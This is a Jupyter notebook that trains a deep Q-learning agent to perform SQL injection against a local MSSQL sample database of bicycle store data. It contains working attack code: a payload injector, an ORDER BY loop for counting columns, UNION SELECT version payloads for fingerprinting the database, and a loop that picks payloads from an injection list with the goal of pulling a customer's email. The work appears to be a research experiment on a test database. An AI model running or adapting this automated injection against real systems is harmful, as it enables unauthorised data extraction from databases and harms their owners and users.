{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 120,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from keras import layers\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys\n",
    "from enum import Enum"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 121,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True, 'query_result_length': 100, 'padding_char': '\\x00'}, 'contexts': [{'query': \"SELECT * FROM production.products WHERE brand_id='[INPUT]' AND category_id=8\", 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}, {'query': \"SELECT * FROM sales.customers WHERE email='[INPUT]'\", 'table_filter': ['sales.customers'], 'column_filter': ['email'], 'goal': 'debra.burks@yahoo.com'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 122,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "db_name = db['name']\n",
    "db_server = db['server']\n",
    "db_driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={db_driver};SERVER={db_server};DATABASE={db_name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 123,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "query_result_length = state_info_config['query_result_length']\n",
    "padding_char = state_info_config['padding_char']\n",
    "error_char = 'y'\n",
    "no_error_char = 'n'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 124,
   "metadata": {},
   "outputs": [],
   "source": [
    "contexts = config['rl']['contexts']\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def increment_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "\n",
    "# Not having any defined RL contexts will result in an error.\n",
    "def reset_context():\n",
    "    global context, context_index\n",
    "    context = contexts[0]\n",
    "    context_index = 0\n",
    "\n",
    "reset_context()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Capability"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 125,
   "metadata": {},
   "outputs": [],
   "source": [
    "def inject_payload(payload):\n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "    # Runs SQL injection query.\n",
    "    return pd.read_sql(query, engine)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Enumerate SQL Database Types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 126,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DBType(Enum):\n",
    "    MSSQL = 0\n",
    "    MySQL = 1\n",
    "    Oracle = 2\n",
    "    PostgeSQL = 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Retrieve Database Type by Injecting Version UNION Payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 127,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DBType.MSSQL\n"
     ]
    }
   ],
   "source": [
    "# Max possible number of SQL columns is 30,000, so this loop should always break.\n",
    "# IBM source: https://www.ibm.com/support/pages/filenet-content-manager-ms-sql-server-database-table-limitations-columns-and-row-size#:~:text=the%20object%20store.-,Answer,30%2C000%20columns%20instead%20of%201024.\n",
    "col_count = 1\n",
    "while True:\n",
    "    payload = f'\\' ORDER BY {col_count+1}--'\n",
    "    try:\n",
    "        df = inject_payload(payload)\n",
    "        col_count += 1\n",
    "    except:\n",
    "        break\n",
    "\n",
    "# With the number of columns gathered, we can perform UNION statements to find the\n",
    "# SQL database type and version. To achieve this, we must find a String column for\n",
    "# the version information to be returned in.\n",
    "#\n",
    "# Database version payloads are for Microsoft and MySQL, Oracle, and PostgreSQL respectively.\n",
    "# Retreived from: https://portswigger.net/web-security/sql-injection/examining-the-database\n",
    "db_suffixes = ['@@version', '* FROM v$version', 'version()']\n",
    "db_type = None\n",
    "for suffix in db_suffixes:\n",
    "    for i in range(0, col_count):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        for j in range(0, col_count):\n",
    "            if i != j:\n",
    "                payload += 'NULL'\n",
    "            else:\n",
    "                payload += suffix\n",
    "            if j != col_count - 1:\n",
    "                payload += ','\n",
    "            else:\n",
    "                payload += '--'\n",
    "        try:\n",
    "            df = inject_payload(payload)\n",
    "            res = df.iloc[-1,i]\n",
    "            if suffix == db_suffixes[0]:\n",
    "                if 'Microsoft SQL Server' in res:\n",
    "                    db_type = DBType.MSSQL\n",
    "                else:\n",
    "                    db_type = DBType.MySQL\n",
    "            elif suffix == db_suffixes[1]:\n",
    "                db_type == DBType.Oracle\n",
    "            elif suffix == db_suffixes[2]:\n",
    "                db_type = DBType.PostgeSQL\n",
    "            break\n",
    "        except:\n",
    "            continue\n",
    "    \n",
    "print(db_type)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Link SQL Injection Attacks to Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 128,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Payloads extracted from generic error and union sections from: https://github.com/payloadbox/sql-injection-payload-list\n",
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "\n",
    "reward_success = 1\n",
    "reward_end = 10\n",
    "reward_norm = 0\n",
    "# Reward for invalid action.\n",
    "reward_mask = -1\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def perform_action(payload_index):\n",
    "    payload = payloads[payload_index]\n",
    "    reward = reward_norm\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        df = inject_payload(payload)\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # An episode will terminate once the goal of the final context is reached.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "        for column in context['column_filter']:\n",
    "            if column in df and context['goal'] in df[column].values:\n",
    "                if context_index < len(contexts) - 1:\n",
    "                    reward = reward_success\n",
    "                    increment_context()\n",
    "                else:\n",
    "                    reward = reward_end\n",
    "                    episode_over = True\n",
    "\n",
    "        res = df.to_csv()\n",
    "        has_error = no_error_char\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = error_char\n",
    "\n",
    "    # Trim resulting string or pad it so that the length is equal to query_result_length.\n",
    "    if len(res) > query_result_length:\n",
    "        res = res[:query_result_length]\n",
    "    else:\n",
    "        res = res.ljust(query_result_length, padding_char)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res = res + has_error\n",
    "\n",
    "    return [ord(s) for s in res], reward, episode_over"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "DQN (Adapted from https://keras.io/examples/rl/deep_q_network_breakout/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 129,
   "metadata": {},
   "outputs": [],
   "source": [
    "gamma = 0.99  # Discount factor for past rewards\n",
    "epsilon = 1.0  # Epsilon greedy parameter\n",
    "epsilon_min = 0.1  # Minimum epsilon greedy parameter\n",
    "epsilon_max = 1.0  # Maximum epsilon greedy parameter\n",
    "epsilon_interval = (\n",
    "    epsilon_max - epsilon_min\n",
    ")  # Rate at which to reduce chance of random action being taken\n",
    "batch_size = 32  # Size of batch taken from replay buffer\n",
    "max_steps_per_episode = 1000\n",
    "max_running_reward = reward_success*0.2\n",
    "\n",
    "num_actions = len(payloads)\n",
    "\n",
    "# If a query result is an error, and if mark_error is true, this distinction will be added to the state information.\n",
    "# TODO: Ensure mark_error information has a higher weighting in the neural net.\n",
    "nn_input_size = query_result_length\n",
    "if(mark_error):\n",
    "    nn_input_size += 1"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 130,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_q_model(batch_size):\n",
    "    # Network defined by the Deepmind paper\n",
    "    inputs = layers.Input(shape=(1, nn_input_size), batch_size=batch_size)\n",
    "\n",
    "    # Convolutions on the frames on the screen\n",
    "    layer1 = layers.Conv1D(32, 1, strides=4, activation=\"relu\")(inputs)\n",
    "    layer2 = layers.Conv1D(64, 1, strides=2, activation=\"relu\")(layer1)\n",
    "    layer3 = layers.Conv1D(64, 1, strides=1, activation=\"relu\")(layer2)\n",
    "\n",
    "    layer4 = layers.Flatten()(layer3)\n",
    "\n",
    "    layer5 = layers.Dense(512, activation=\"relu\")(layer4)\n",
    "    action = layers.Dense(num_actions, activation=\"linear\")(layer5)\n",
    "\n",
    "    return keras.Model(inputs=inputs, outputs=action)\n",
    "\n",
    "# The first model makes the predictions for Q-values which are used to\n",
    "# make an action.\n",
    "model = create_q_model(1)\n",
    "# Build a target model for the prediction of future rewards.\n",
    "# The weights of a target model get updated every 10000 steps thus when the\n",
    "# loss between the Q-values is calculated the target Q-value is stable.\n",
    "model_target = create_q_model(batch_size)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create All Possible Payloads (Action Space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 131,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_empty_state():\n",
    "    state = padding_char * query_result_length\n",
    "    if mark_error:\n",
    "        state = state + no_error_char\n",
    "    state = [ord(s) for s in state]\n",
    "    return state"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 132,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_23036\\2762333196.py:23: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if column in df and context['goal'] in df[column].values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 0\t Frame count: 100\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 200\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 300\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 400\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 500\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 600\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 700\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 800\n",
      "Running reward: 0.00\t Episode 0\t Frame count: 900\n",
      "Solved at episode 1!\n"
     ]
    }
   ],
   "source": [
    "# In the Deepmind paper they use RMSProp however then Adam optimizer\n",
    "# improves training time\n",
    "optimizer = keras.optimizers.Adam(learning_rate=0.00025, clipnorm=1.0)\n",
    "\n",
    "# Experience replay buffers\n",
    "action_history = []\n",
    "state_history = []\n",
    "state_next_history = []\n",
    "rewards_history = []\n",
    "done_history = []\n",
    "episode_reward_history = []\n",
    "# Keep track of unique episodic solutions.\n",
    "solutions = set()\n",
    "running_reward = 0\n",
    "episode_count = 0\n",
    "frame_count = 0\n",
    "# Number of frames to take random action and observe output\n",
    "epsilon_random_frames = 50\n",
    "# Number of frames for exploration\n",
    "epsilon_greedy_frames = 100.0\n",
    "# Maximum replay length\n",
    "# Note: The Deepmind paper suggests 1000000 however this causes memory issues\n",
    "max_memory_length = 20\n",
    "# Train the model after 4 actions\n",
    "update_after_actions = 4\n",
    "# How often to update the target network\n",
    "update_target_network = 100\n",
    "# Using huber loss for stability\n",
    "loss_function = keras.losses.Huber()\n",
    "\n",
    "while True:  # Run until solved\n",
    "    state = create_empty_state()\n",
    "    episode_reward = 0\n",
    "    reset_context()\n",
    "    episode_solutions = []\n",
    "\n",
    "    for timestep in range(1, max_steps_per_episode):\n",
    "        # env.render(); Adding this line would show the attempts\n",
    "        # of the agent in a pop up window.\n",
    "        frame_count += 1\n",
    "\n",
    "        # Use epsilon-greedy for exploration\n",
    "        if frame_count < epsilon_random_frames or epsilon > np.random.rand(1)[0]:\n",
    "            # Take random action\n",
    "            action = np.random.choice(num_actions)\n",
    "        else:\n",
    "            # Predict action Q-values\n",
    "            # From environment state\n",
    "            state = np.array(state).reshape(1, 1, nn_input_size)\n",
    "            action_probs = model(state, training=False)\n",
    "            # Take best action\n",
    "            action = tf.argmax(action_probs[0]).numpy()\n",
    "\n",
    "        # Decay probability of taking random action\n",
    "        epsilon -= epsilon_interval / epsilon_greedy_frames\n",
    "        epsilon = max(epsilon, epsilon_min)\n",
    "\n",
    "        # Apply the sampled action in our environment\n",
    "        state_next, reward, done = perform_action(action)\n",
    "        state_next = np.array(state_next)\n",
    "\n",
    "        episode_reward += reward\n",
    "\n",
    "        # If the reward is positive, a context has been solved.\n",
    "        # Keep track of this.\n",
    "        if reward > 0:\n",
    "            episode_solutions.append(action)\n",
    "\n",
    "        # Save actions and states in replay buffer\n",
    "        action_history.append(action)\n",
    "        state_history.append(state)\n",
    "        state_next_history.append(state_next)\n",
    "        done_history.append(done)\n",
    "        rewards_history.append(reward)\n",
    "        state = state_next\n",
    "\n",
    "        # Update every fourth frame and once batch size is over 32\n",
    "        if frame_count % update_after_actions == 0 and len(done_history) > batch_size:\n",
    "\n",
    "            # Get indices of samples for replay buffers\n",
    "            indices = np.random.choice(range(len(done_history)), size=batch_size)\n",
    "\n",
    "            # Using list comprehension to sample from replay buffer\n",
    "            state_sample = np.array([state_history[i] for i in indices])\n",
    "            state_next_sample = np.array([state_next_history[i] for i in indices]).reshape(batch_size, 1, nn_input_size)\n",
    "            rewards_sample = [rewards_history[i] for i in indices]\n",
    "            action_sample = [action_history[i] for i in indices]\n",
    "            done_sample = tf.convert_to_tensor(\n",
    "                [float(done_history[i]) for i in indices]\n",
    "            )\n",
    "\n",
    "            # Build the updated Q-values for the sampled future states\n",
    "            # Use the target model for stability\n",
    "            future_rewards = model_target.predict(state_next_sample, batch_size=batch_size)\n",
    "            # Q value = reward + discount factor * expected future reward\n",
    "            updated_q_values = rewards_sample + gamma * tf.reduce_max(\n",
    "                future_rewards, axis=1\n",
    "            )\n",
    "\n",
    "            # If final frame set the last value to -1\n",
    "            updated_q_values = updated_q_values * (1 - done_sample) - done_sample\n",
    "\n",
    "            # Create a mask so we only calculate loss on the updated Q-values\n",
    "            masks = tf.one_hot(action_sample, num_actions)\n",
    "\n",
    "            with tf.GradientTape() as tape:\n",
    "                # Train the model on the states and updated Q-values\n",
    "                q_values = model(state_sample)\n",
    "\n",
    "                # Apply the masks to the Q-values to get the Q-value for action taken\n",
    "                q_action = tf.reduce_sum(tf.multiply(q_values, masks), axis=1)\n",
    "                # Calculate loss between new Q-value and old Q-value\n",
    "                loss = loss_function(updated_q_values, q_action)\n",
    "\n",
    "            # Backpropagation\n",
    "            grads = tape.gradient(loss, model.trainable_variables)\n",
    "            optimizer.apply_gradients(zip(grads, model.trainable_variables))\n",
    "\n",
    "        if frame_count % update_target_network == 0:\n",
    "            # update the the target network with new weights\n",
    "            model_target.set_weights(model.get_weights())\n",
    "            # Log details\n",
    "            template = 'Running reward: {:.2f}\\t Episode {}\\t Frame count: {}'\n",
    "            print(template.format(running_reward, episode_count, frame_count))\n",
    "\n",
    "        # Limit the state and reward history\n",
    "        if len(rewards_history) > max_memory_length:\n",
    "            del rewards_history[:1]\n",
    "            del state_history[:1]\n",
    "            del state_next_history[:1]\n",
    "            del action_history[:1]\n",
    "            del done_history[:1]\n",
    "\n",
    "        if done:\n",
    "            # Append the chain of solutions for this episode.\n",
    "            # This episode's solutions must be converted to a tuple to\n",
    "            # ensure the overall solutions set only contains unique elements.\n",
    "            solutions.add(tuple(episode_solutions))\n",
    "            break\n",
    "\n",
    "    # Update running reward to check condition for solving\n",
    "    episode_reward_history.append(episode_reward)\n",
    "    if len(episode_reward_history) > 100:\n",
    "        del episode_reward_history[:1]\n",
    "    running_reward = np.mean(episode_reward_history)\n",
    "\n",
    "    episode_count += 1\n",
    "\n",
    "    if running_reward > max_running_reward:  # Condition to consider the task solved\n",
    "        print(f'Solved at episode {episode_count}!')\n",
    "        break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 135,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Successful SQL injection solutions: []\n",
      "[349, 349, 349, 458, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349, 349]\n"
     ]
    }
   ],
   "source": [
    "print('Successful SQL injection solutions:', [payloads[i] for es in solutions for i in list(es)])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "844694dc4390c811ac8b4d2fcaa7d18288efc8c697b009159baa2dd36f994a81"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
